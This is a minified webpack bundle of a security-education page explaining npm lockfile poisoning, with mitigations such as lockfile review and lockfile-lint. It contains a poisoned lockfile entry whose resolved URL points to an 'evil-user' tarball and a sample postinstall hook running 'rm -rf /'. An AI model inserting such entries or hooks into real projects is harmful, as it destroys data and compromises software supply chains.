(window.webpackJsonp=window.webpackJsonp||[]).push([[19],{gNfW:function(e,t,n){"use strict";n.r(t),n.d(t,"_frontmatter",(function(){return l})),n.d(t,"default",(function(){return s}));n("5hJT"),n("W1QL"),n("K/PF"),n("t91x"),n("75LO"),n("PJhk"),n("mXGw");var a=n("/FXl"),i=n("TjRS");n("aD51");function o(){return(o=Object.assign||function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e}).apply(this,arguments)}var l={};void 0!==l&&l&&l===Object(l)&&Object.isExtensible(l)&&!l.hasOwnProperty("__filemeta")&&Object.defineProperty(l,"__filemeta",{configurable:!0,value:{name:"_frontmatter",filename:"src/attacks_explained/lockfile.mdx"}});var c={_frontmatter:l},r=i.a;function s(e){var t=e.components,n=function(e,t){if(null==e)return{};var n,a,i={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,["components"]);return Object(a.b)(r,o({},c,n,{components:t,mdxType:"MDXLayout"}),Object(a.b)("h1",{id:"lockfile-attack"},"Lockfile Attack"),Object(a.b)("h2",{id:"the-attack"},"The Attack"),Object(a.b)("p",null,"This attack is very specific to the Nodejs ecosystem and it ",Object(a.b)("a",o({parentName:"p"},{href:"https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/"}),"was discovered in 2019")," by ",Object(a.b)("a",o({parentName:"p"},{href:"https://twitter.com/liran_tal"}),"Liran Tal"),"."),Object(a.b)("p",null,"It is quite common to include external dependencies in Nodejs. The ecosystem is heavily based in ",Object(a.b)("a",o({parentName:"p"},{href:"https://www.npmjs.com/"}),"NPM Registry (+1M packages)"),"."),Object(a.b)("p",null,"Most projects manage their dependencies using the Npm official client or Yarn. A few years ago, both tools introduced the lockfile concept to the ecosystem (",Object(a.b)("inlineCode",{parentName:"p"},"package-lock.json")," and ",Object(a.b)("inlineCode",{parentName:"p"},"yarn.lock"),")."),Object(a.b)("p",null,"If the project has a lockfile available, the package manager will install the dependencies from the lockfile as the primary source of truth. This lead us to a new vector where a malicious actor can submit a poisonous dependency through the lockfile as most of maintainers don't review the lockfiles during the PR Reviews."),Object(a.b)("p",null,"This is a regular ",Object(a.b)("inlineCode",{parentName:"p"},"package-lock.json"),"."),Object(a.b)("pre",null,Object(a.b)("code",o({parentName:"pre"},{className:"language-json"}),'{\n  "name": "my-project",\n  "version": "0.0.1",\n  "lockfileVersion": 1,\n  "requires": true,\n  "dependencies": {\n    "@babel/code-frame": {\n      "version": "7.8.3",\n      "resolved": "https://registry.npmjs.org/@babel/code-frame/-/code-frame-7.8.3.tgz",\n      "integrity": "sha512-a9gxpmdXtZEInkCSHUJDLHZVBgb1QS0jhss4cPP93EW7s+uC5bikET2twEF3KV+7rDblJcmNvTR7VJejqd2C2g==",\n      "dev": true,\n      "requires": {\n        "@babel/highlight": "^7.8.3"\n      }\n    }\n    //...\n  }\n}\n')),Object(a.b)("p",null,"The malicious attack takes place when the ",Object(a.b)("inlineCode",{parentName:"p"},"resolved")," and ",Object(a.b)("inlineCode",{parentName:"p"},"integrity")," are not corresponding to official sources:"),Object(a.b)("pre",null,Object(a.b)("code",o({parentName:"pre"},{className:"language-json"}),'{\n  "name": "my-project",\n  "version": "0.0.1",\n  "lockfileVersion": 1,\n  "requires": true,\n  "dependencies": {\n    "@babel/code-frame": {\n      "version": "7.8.3",\n      "resolved": "https://github.com/evil-user/code-frame/tarball/master",\n      "integrity": "sha512-VT0ZI6kZRdTh8YyJw3SMbYm/u+NqfsAxEpWO0Pf9sq8/e94WxxOpPKx9FR1FlyCtOVDNOQ+8ntlqFxiRc+r5qA==",\n      "dev": true,\n      "requires": {\n        "@babel/highlight": "^7.8.3"\n      }\n    }\n    //...\n  }\n}\n')),Object(a.b)("p",null,"So the risk in this case is that ",Object(a.b)("inlineCode",{parentName:"p"},"@babel/code-frame")," is not installed from the NPM registry. This can lead to many attacks based on the npm lifecycle (pre-install, post-install...)"),Object(a.b)("p",null,"As an example of malicious script added in the poisoned version of ",Object(a.b)("inlineCode",{parentName:"p"},"@babel/code-frame")),Object(a.b)("pre",null,Object(a.b)("code",o({parentName:"pre"},{}),'"scripts": {\n   "postinstall": "rm -rf /",\n}\n')),Object(a.b)("h2",{id:"the-solution"},"The solution"),Object(a.b)("p",null,"There are no definitive solutions to avoid this attack, but it can be highly mitigated."),Object(a.b)("h2",{id:"mitigation"},"Mitigation"),Object(a.b)("ul",null,Object(a.b)("li",{parentName:"ul"},"Always review the lockfiles in the PRs."),Object(a.b)("li",{parentName:"ul"},"Use a tool to check the lockfile sources enables like ",Object(a.b)("inlineCode",{parentName:"li"},"lockfile-lint"),Object(a.b)("pre",{parentName:"li"},Object(a.b)("code",o({parentName:"pre"},{className:"language-bash"}),"npx lockfile-lint --path yarn.lock --type yarn --validate-https --allowed-hosts yarnpkg.org\n"))),Object(a.b)("li",{parentName:"ul"},"Include the validation tools in the CI process (testing phase and security checks)"),Object(a.b)("li",{parentName:"ul"},"Optional: You can include the sources validation with Git Hooks too (using Husky)")),Object(a.b)("h3",{id:"refs"},"Refs"),Object(a.b)("ul",null,Object(a.b)("li",{parentName:"ul"},Object(a.b)("a",o({parentName:"li"},{href:"https://snyk.io/blog/what-is-package-lock-json/"}),"Snyk | What is package lock json and how a lockfile works for yarn and npm packages?")),Object(a.b)("li",{parentName:"ul"},Object(a.b)("a",o({parentName:"li"},{href:"https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/"}),"Snyk | Why npm lockfiles can be a security blindspot for injecting malicious modules")),Object(a.b)("li",{parentName:"ul"},Object(a.b)("a",o({parentName:"li"},{href:"https://medium.com/coinmonks/everything-you-wanted-to-know-about-package-lock-json-b81911aa8ab8"}),"Medium | Everything You Wanted To Know About package-lock.json But Were Too Afraid To Ask"))))}void 0!==s&&s&&s===Object(s)&&Object.isExtensible(s)&&!s.hasOwnProperty("__filemeta")&&Object.defineProperty(s,"__filemeta",{configurable:!0,value:{name:"MDXContent",filename:"src/attacks_explained/lockfile.mdx"}}),s.isMDXComponent=!0}}]);
//# sourceMappingURL=component---src-attacks-explained-lockfile-mdx-ab3b08124f3f0377cffa.js.map